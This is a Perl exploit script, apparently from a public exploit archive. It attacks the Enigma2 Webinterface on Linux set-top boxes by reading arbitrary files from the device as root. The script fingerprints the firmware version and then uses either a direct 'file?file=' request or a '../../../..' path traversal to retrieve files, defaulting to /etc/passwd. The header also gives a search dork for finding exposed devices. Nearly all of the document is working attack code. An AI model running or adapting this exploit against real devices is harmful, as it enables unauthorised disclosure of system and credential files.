#!/usr/bin/perl
#
#  Enigma2 Webinterface 1.7.x 1.6.x 1.5.x remote root file disclosure exploit
##
#  Author: Todor Donev
#  Email me: todor.donev@@gmail.com
#  Platform: Linux
#  Type: remote
##
#  Gewgle Dork: "Enigma2 movielist" filetype:rss
##
#
#  Enigma2 is a framebuffer-based zapping application (GUI) for linux. 
#  It's targeted to real set-top-boxes, but would also work on regular PCs. 
#  Enigma2 is based on the Python programming language with a backend 
#  written in C++. It uses the [LinuxTV DVB API], which is part of a standard linux kernel.
#
#  Enigma2 can also be controlled via an Enigma2:WebInterface. 
##
#  Thanks to Tsvetelina Emirska !!
##
use LWP::Simple;
$t = $ARGV[0];
if(! $t) {usg();}
$d = $ARGV[1];
if(! $d) {$d = "/etc/passwd";}
my $r = get("http://$t/web/about") or exit;
print "[+] Enigma2 Webinterface 1.7.x 1.6.x 1.5.x remote exploit\n";
print "[+] Target: $t\n";
if ($r =~ m/<e2webifversion>(.*)<\/e2webifversion>/g){
print "[+] Image Version: $1\n";
}
if ($r =~ (m/1.6.0|1.6.1|1.6.2|1.6.3|1.6.4|1.6.5|1.6.6|1.6.7|1.6.8|1.6rc3|1.7.0/i)){
print "[+] Exploiting Enigma2 via type1 (file?file=$d)\n";
result(exploit1());
}
if ($r =~ (m/1.5rc1|1.5beta4/i)){
print "[+] Exploiting Enigma2 via type2 (file/?file=../../../..$d)\n";
result(exploit2());
}
sub usg{
print "\n[+] Enigma2 Webinterface 1.7.x 1.6.x 1.5.x remote exploit\n";
print "[+] Usage: perl enigma2.pl <victim> </path/file>\n";
exit;
}
sub exploit1{
my $x = get("http://$t/file?file=$d");
}
sub exploit2{
my $x = get("http://$t/file/?file=../../../..$d");
}
sub result{
my $x= shift;
while(defined $x){
print "$x\n";
print "[+] I got it 4 cheap.. =)\n";
exit;
}}